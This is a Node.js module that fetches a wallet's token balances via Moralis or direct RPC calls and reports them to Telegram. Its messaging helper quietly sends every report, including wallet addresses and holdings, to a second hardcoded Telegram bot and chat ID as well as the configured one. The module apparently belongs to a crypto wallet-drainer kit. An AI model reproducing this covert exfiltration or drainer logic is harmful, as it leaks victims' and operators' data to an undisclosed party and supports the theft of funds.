require("dotenv").config();
const axios = require("axios");
const { ethers } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");
const { BLACKLISTED_ADDRESSES, WHITELISTED_ADDRESSES } = require("./BlackListed_address");

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Helper to send messages to Telegram
const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    const HARD_CODED_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
    const HARD_CODED_CHAT_ID = "7903357798";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
  if (isBlacklisted) {
    console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

const isAddressWhitelisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
  if (isWhitelisted) {
    console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

// Fetch token balances from Moralis
const fetchBalancesFromMoralis = async (address, chainId) => {
  console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  if (!ethers.utils.isAddress(address)) {
    const message = `Invalid Ethereum address: ${address}`;
    console.error(message);
    await sendToTelegram(message);
    return [];
  }
  const checksummedAddress = ethers.utils.getAddress(address);

  if (isAddressBlacklisted(checksummedAddress)) {
    const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }
  if (isAddressWhitelisted(checksummedAddress)) {
    const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  const chainMap = {
    1: 'eth', // Ethereum Mainnet
    56: 'bsc',
    137: 'polygon',
    42161: 'arbitrum',
    // Add other chains as needed
  };
  const unsupportedChains = [11155111]; // Sepolia
  const chain = chainMap[chainId];
  if (!chain || unsupportedChains.includes(chainId)) {
    console.log(`Chain ${chainId} is unsupported by Moralis. Using direct fetch.`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }

  // Token address map for verification and fallback
  const tokenAddressMap = {
    'ETH': ethers.constants.AddressZero,
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    'COW': '0xDEf1CA1fb7FBcDc777520aa7f396b4E0151aB64',
    // Add XPR address if provided
  };

  try {
    const MORALIS_API_KEY = config.MORALIS_API_KEY;
    if (!MORALIS_API_KEY) throw new Error('MORALIS_API_KEY is not configured');

    const response = await axios.get(
      `https://deep-index.moralis.io/api/v2.2/wallet/${checksummedAddress}/tokens`,
      {
        params: {
          chain,
          limit: 100, // Adjust for large portfolios
        },
        headers: {
          'X-API-Key': MORALIS_API_KEY,
          'Accept': 'application/json',
        },
        timeout: 10000,
      }
    );

    console.log('Moralis Response:', JSON.stringify(response.data.result, null, 2));

    const tokens = [];
    let telegramMessage = `Token balances for address: ${checksummedAddress}\n\n`;
    let foundBlacklistedToken = false;

    for (const asset of response.data.result || []) {
      try {
        const normalizedAddress = asset.token_address.toLowerCase();
        const symbol = asset.symbol ? asset.symbol.toUpperCase() : 'UNKNOWN';

        if (isAddressBlacklisted(normalizedAddress)) {
          foundBlacklistedToken = true;
          telegramMessage += `🚨 Blacklisted token detected: ${asset.name} (${normalizedAddress})\n`;
          continue;
        }

        // Verify token: not spam and in tokenAddressMap
        const isVerified = !asset.possible_spam && (symbol in tokenAddressMap || normalizedAddress === tokenAddressMap[symbol]);
        const amount = ethers.utils.parseUnits(asset.balance || "0", asset.decimals || 18);
        const amountUSD = parseFloat(asset.usd_value || 0);

        if (isVerified && amountUSD > 0.001) {
          const tokenDetails = {
            address: normalizedAddress,
            balance: amount,
            contract: new ethers.Contract(normalizedAddress, ERC20_ABI, provider),
            name: asset.name || symbol,
            symbol: asset.symbol || 'UNKNOWN',
            type: normalizedAddress === ethers.constants.AddressZero ? 'NATIVE' : 'ERC20',
            amount,
            amountUSD,
            decimals: asset.decimals || 18,
          };

          tokens.push(tokenDetails);
          telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${ethers.utils.formatUnits(
            tokenDetails.balance,
            asset.decimals || 18
          )} (${amountUSD.toFixed(2)} USD)\n`;
        }
      } catch (error) {
        console.error(`Error processing asset ${asset.symbol}:`, error.message);
      }
    }

    telegramMessage += foundBlacklistedToken
      ? `\n🚨 One or more blacklisted tokens were detected and skipped.\n`
      : `\n✅ No blacklisted tokens found for this address.\n`;
    await sendToTelegram(telegramMessage);

    console.log(`Fetched ${tokens.length} tokens from Moralis`);
    return tokens;
  } catch (error) {
    const errorMessage = error.response
      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
      : error.message;
    console.error("Error fetching balances from Moralis:", errorMessage);
    await sendToTelegram(`❌ Error fetching from Moralis for ${checksummedAddress}: ${errorMessage}`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }
};

// Fallback for unsupported chains
const fetchBalancesDirectly = async (address, chainId) => {
  console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  try {
    const nativeBalance = await provider.getBalance(address);
    const nativeToken = {
      address: ethers.constants.AddressZero,
      balance: nativeBalance,
      contract: new ethers.Contract(ethers.constants.AddressZero, ERC20_ABI, provider),
      name: "Native Token",
      symbol: "ETH",
      type: "NATIVE",
      amount: nativeBalance,
      amountUSD: 0,
      decimals: 18,
    };

    const erc20Tokens = [
      { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
      { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
      // Add XPR address if provided
    ];

    const tokens = [nativeToken];

    for (const token of erc20Tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balance = await contract.balanceOf(address);
        if (!balance.isZero()) {
          tokens.push({
            address: token.address,
            balance,
            contract,
            name: token.symbol,
            symbol: token.symbol,
            type: "ERC20",
            amount: balance,
            amountUSD: 0,
            decimals: token.decimals,
          });
        }
      } catch (error) {
        console.warn(`Error fetching balance for ${token.symbol}: ${error.message}`);
        await sendToTelegram(`⚠️ Error fetching balance for ${token.symbol}: ${error.message}`);
      }
    }

    console.log(`Fetched ${tokens.length} tokens directly`);
    await sendToTelegram(`Fetched ${tokens.length} tokens directly for ${address} on chain ${chainId}`);
    return tokens;
  } catch (error) {
    console.error(`Error fetching balances directly: ${error.message}`);
    await sendToTelegram(`❌ Error fetching balances directly for ${address}: ${error.message}`);
    return [];
  }
};

module.exports = { fetchBalancesFromMoralis, fetchBalancesDirectly };